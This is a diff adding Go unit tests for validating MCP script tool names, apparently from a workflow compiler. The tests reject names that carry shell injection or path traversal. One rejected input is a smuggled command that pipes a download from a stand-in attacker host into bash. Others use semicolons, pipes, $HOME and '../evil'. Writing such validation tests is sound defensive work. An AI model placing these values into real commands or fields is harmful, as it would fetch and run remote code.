@@ -140,3 +140,109 @@ func TestIsMCPScriptsEnabledWithEnv(t *testing.T) {
 // TestParseMCPScriptsAndExtractMCPScriptsConfigConsistency verifies that ParseMCPScripts
 // and extractMCPScriptsConfig produce identical results for the same input.
 // This ensures both functions use the shared helper correctly.
+
+// TestValidateMCPScriptToolName tests the toolName validation function.
+func TestValidateMCPScriptToolName(t *testing.T) {
+	validNames := []string{
+		"mytool",
+		"my-tool",
+		"my_tool",
+		"Tool1",
+		"fetch-data",
+		"fetchData",
+		"a",
+		"A1_b-C",
+		// 64 characters (max allowed)
+		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab",
+	}
+	for _, name := range validNames {
+		t.Run("valid_"+name, func(t *testing.T) {
+			if err := validateMCPScriptToolName(name); err != nil {
+				t.Errorf("Expected valid tool name %q to pass validation, got error: %v", name, err)
+			}
+		})
+	}
+
+	invalidNames := []string{
+		"",
+		"1tool",    // starts with digit
+		"-tool",    // starts with hyphen
+		"_tool",    // starts with underscore
+		"foo bar",  // space
+		"foo;bar",  // semicolon (shell injection)
+		"foo|bar",  // pipe (shell injection)
+		"foo&bar",  // ampersand (shell injection)
+		"foo$bar",  // dollar (shell injection)
+		"foo/bar",  // path separator
+		"../evil",  // path traversal
+		"foo\nbar", // newline
+		"foo\tbar", // tab
+		"foo`bar",  // backtick
+		"foo>bar",  // redirect
+		"foo<bar",  // redirect
+		"foo!bar",  // exclamation
+		// 65 characters (one over max)
+		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abc",
+	}
+	for _, name := range invalidNames {
+		t.Run("invalid", func(t *testing.T) {
+			if err := validateMCPScriptToolName(name); err == nil {
+				t.Errorf("Expected invalid tool name %q to fail validation, but it passed", name)
+			}
+		})
+	}
+}
+
+// TestParseMCPScriptsMapRejectsInvalidToolName verifies that parseMCPScriptsMap returns
+// an error for tool names containing shell metacharacters or path traversal sequences.
+func TestParseMCPScriptsMapRejectsInvalidToolName(t *testing.T) {
+	maliciousNames := []string{
+		"foo; curl http://evil.com | bash #",
+		"foo|bar",
+		"../evil",
+		"foo$HOME",
+	}
+	for _, toolName := range maliciousNames {
+		t.Run("reject_"+toolName, func(t *testing.T) {
+			m := map[string]any{
+				toolName: map[string]any{
+					"description": "evil tool",
+					"script":      "return 'hi';",
+				},
+			}
+			_, _, err := parseMCPScriptsMap(m)
+			if err == nil {
+				t.Errorf("Expected parseMCPScriptsMap to reject tool name %q but it succeeded", toolName)
+			}
+		})
+	}
+}
+
+// TestExtractMCPScriptsConfigRejectsInvalidToolName verifies that compiler extraction
+// returns an error for invalid tool names.
+func TestExtractMCPScriptsConfigRejectsInvalidToolName(t *testing.T) {
+	frontmatter := map[string]any{
+		"mcp-scripts": map[string]any{
+			"foo; evil": map[string]any{
+				"description": "injected tool",
+				"script":      "return 1;",
+			},
+		},
+	}
+	_, err := (&Compiler{}).extractMCPScriptsConfig(frontmatter)
+	if err == nil {
+		t.Error("Expected extractMCPScriptsConfig to return error for invalid tool name, got nil")
+	}
+}
+
+// TestMergeMCPScriptsRejectsInvalidToolName verifies that mergeMCPScripts returns an error
+// when an imported config contains an invalid tool name.
+func TestMergeMCPScriptsRejectsInvalidToolName(t *testing.T) {
+	compiler := &Compiler{}
+	main := &MCPScriptsConfig{Tools: make(map[string]*MCPScriptToolConfig)}
+	importedJSON := `{"foo|evil": {"description": "bad", "script": "return 0;"}}`
+	_, err := compiler.mergeMCPScripts(main, []string{importedJSON})
+	if err == nil {
+		t.Error("Expected mergeMCPScripts to return error for invalid imported tool name, got nil")
+	}
+}
